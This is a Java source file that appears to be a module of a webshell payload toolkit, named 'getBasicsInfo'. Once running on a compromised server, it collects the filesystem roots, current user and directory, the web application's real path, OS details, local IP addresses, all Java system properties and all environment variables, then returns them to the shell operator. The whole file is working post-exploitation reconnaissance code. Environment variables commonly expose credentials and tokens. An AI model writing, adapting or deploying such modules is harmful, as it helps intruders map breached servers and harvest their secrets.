package shells.payloads.java.modules;

import java.io.File;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * Basic Info Module - Get system basic information
 */
public class BasicInfoModule {
    
    private Map session;
    private Object servletRequest;
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public String getModuleName() {
        return "getBasicsInfo";
    }
    
    public byte[] execute() {
        String info = "";

        try {
            Enumeration properties = System.getProperties().keys();
            info = info + "FileRoot : " + listFileRoot() + "\n";
            info = info + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
            info = info + "CurrentUser : " + System.getProperty("user.name") + "\n";
            info = info + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

            String tempDir;
            try {
                tempDir = System.getProperty("java.io.tmpdir");
                char lastChar = tempDir.charAt(tempDir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tempDir = tempDir + File.separator;
                }
                info = info + "TempDirectory : " + tempDir + "\n";
            } catch (Exception e) {
            }

            info = info + "RealFile : " + getRealPath() + "\n";

            try {
                info = info + "OsInfo : os.name: " + System.getProperty("os.name") + 
                       " os.version: " + System.getProperty("os.version") + 
                       " os.arch: " + System.getProperty("os.arch") + "\n";
            } catch (Exception e) {
                info = info + "OsInfo : " + e.getMessage() + "\n";
            }

            info = info + "IPList : " + getLocalIPList() + "\n";
            
            while (properties.hasMoreElements()) {
                String key = (String) properties.nextElement();
                info = info + key + " : " + System.getProperty(key) + "\n";
            }

            Map env = getEnv();
            if (env != null) {
                for (Iterator it = env.keySet().iterator(); it.hasNext();) {
                    String key = (String) it.next();
                    info = info + key + " : " + env.get(key) + "\n";
                }
            }

            return info.getBytes();
        } catch (Exception e) {
            StringBuffer error = new StringBuffer();
            error.append(info);
            error.append("Exception errMsg:");
            error.append(e.getMessage());
            return error.toString().getBytes();
        }
    }
    
    private String listFileRoot() {
        try {
            File[] roots = File.listRoots();
            if (roots != null && roots.length > 0) {
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < roots.length; i++) {
                    builder.append(roots[i].getPath()).append(";");
                }
                return builder.toString();
            }
        } catch (Exception e) {
        }
        return "/";
    }
    
    private String getRealPath() {
        try {
            if (servletRequest != null) {
                java.lang.reflect.Method method = servletRequest.getClass().getMethod("getRealPath", String.class);
                return (String) method.invoke(servletRequest, "/");
            }
        } catch (Exception e) {
        }
        return "";
    }
    
    private String getLocalIPList() {
        try {
            java.net.InetAddress[] addresses = java.net.InetAddress.getAllByName(java.net.InetAddress.getLocalHost().getHostName());
            StringBuilder ips = new StringBuilder();
            for (java.net.InetAddress addr : addresses) {
                if (!addr.isLoopbackAddress()) {
                    ips.append(addr.getHostAddress()).append(",");
                }
            }
            return ips.length() > 0 ? ips.substring(0, ips.length() - 1) : "";
        } catch (Exception e) {
            return "";
        }
    }
    
    private Map getEnv() {
        try {
            return System.getenv();
        } catch (Exception e) {
            return new HashMap();
        }
    }
}
